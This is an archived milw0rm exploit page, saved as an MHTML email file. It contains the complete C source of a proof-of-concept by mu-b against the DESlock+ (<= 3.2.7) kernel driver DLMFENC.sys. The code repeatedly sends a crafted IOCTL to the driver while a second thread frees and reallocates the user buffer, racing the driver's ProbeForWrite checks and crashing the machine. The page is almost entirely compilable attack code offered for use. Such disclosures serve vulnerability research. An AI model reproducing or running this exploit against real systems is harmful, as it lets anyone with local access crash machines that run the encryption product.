From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
Subject: DESlock+ <= 3.2.7 Local Kernel Race Condition Denial of Service PoC
Date: Sat, 27 Mar 2010 23:04:54 +0800
MIME-Version: 1.0
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Location: http://milw0rm.com/exploits/6497
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579

=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>DESlock+ <=3D 3.2.7 Local Kernel Race Condition =
Denial of Service PoC</TITLE>
<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
<META content=3D"MSHTML 6.00.6000.16981" name=3DGENERATOR></HEAD>
<BODY><PRE>/* deslock-probe-race.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * DESlock+ &lt;=3D 3.2.7 local kernel race condition DoS POC
 * by mu-b - Fri 22 Feb 2008
 *
 * - Tested on: DLMFENC.sys 1.0.0.28
 *
 * race conditions between calls to ProbeForRead/ProbeForWrite
 * and pointer use.
 *
 * "Note that subsequent accesses by the driver to the user-mode
 *   buffer must also be encapsulated within a try/except block;"
 *  - http://msdn.microsoft.com/en-us/library/ms797108.aspx
 *
 * =
http://www.cctmark.gov.uk/CCTMAwards/DataEncryptionSystemsLtd/tabid/103/D=
efault.aspx
 * - I wonder what that says about CESG CCTM?
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;windows.h&gt;

#define DLMFENC_IOCTL 0x0FA4204C
#define DLMFENC_FLAG  0xDEADBEEF

#define ARG_SIZE(a)   ((a-(sizeof (int)*2))/sizeof (void *))

struct ioctl_req {
  int flag;
  int req_num;
  void *arg[ARG_SIZE(0x20)];
};

void
hammer_thread (void *zpage)
{
  BOOL result;

  printf ("* [child] using page @0x%08X\n", zpage);

  while (1)
    {
      result =3D VirtualFree (zpage, 0, MEM_RELEASE);
      if (result =3D=3D 0)
        {
          fprintf (stderr, "* [child] VirtualFree failed\n");
          exit (EXIT_FAILURE);
        }

      zpage =3D VirtualAlloc ((LPVOID) 0x41000000, 0x10000,
                             MEM_RESERVE|MEM_COMMIT, =
PAGE_EXECUTE_READWRITE);
      if (zpage =3D=3D NULL)
        {
          fprintf (stderr, "* [child] VirtualAlloc failed\n");
          exit (EXIT_FAILURE);
        }
    }
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  HANDLE hFile, hThread;
  DWORD rlen, dThread, nTotal, nFail;
  LPVOID zpage;
  BOOL result;

  printf ("DESlock+ &lt;=3D 3.2.7 local kernel race condition DoS PoC\n"
          "by: &lt;mu-b@digit-labs.org&gt;\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  fflush (stdout);
  hFile =3D CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile =3D=3D INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  zpage =3D VirtualAlloc ((LPVOID) 0x41000000, 0x10000,
                        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage =3D=3D NULL)
    {
      fprintf (stderr, "* VirtualAlloc failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x10000);

  hThread =3D CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) =
hammer_thread,
                          zpage, 0, &amp;dThread);
  if (hThread =3D=3D NULL)
    {
      fprintf (stderr, "* CreateThread failed\n");
      exit (EXIT_FAILURE);
    }

  nTotal =3D nFail =3D 0;
  while (1)
    {
      memset (&amp;req, 0, sizeof req);
      req.flag =3D DLMFENC_FLAG;
      req.req_num =3D 4;
      req.arg[0] =3D (void *) zpage;

      nTotal++;
      result =3D DeviceIoControl (hFile, DLMFENC_IOCTL,
                                &amp;req, sizeof req, &amp;req, sizeof =
req, &amp;rlen, 0);
      if (!result)
        {
          if (!(nFail++ % 1024))
            {
              char *p_arr[] =3D { "DESLock", "ProbeForWrite", "a", =
"races",
                                "dull", "make", "boy" };
              fprintf (stderr, "* total: %d [failed: %d, %f%%] =
[%13s]\r",
                       nTotal, nFail, (((double) nFail)/nTotal)*100, =
p_arr[nFail%7]);
              fflush (stderr);
          }
        }
    }

  /* unreachable! */
  printf ("* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-09-20]</PRE></BODY></HTML>
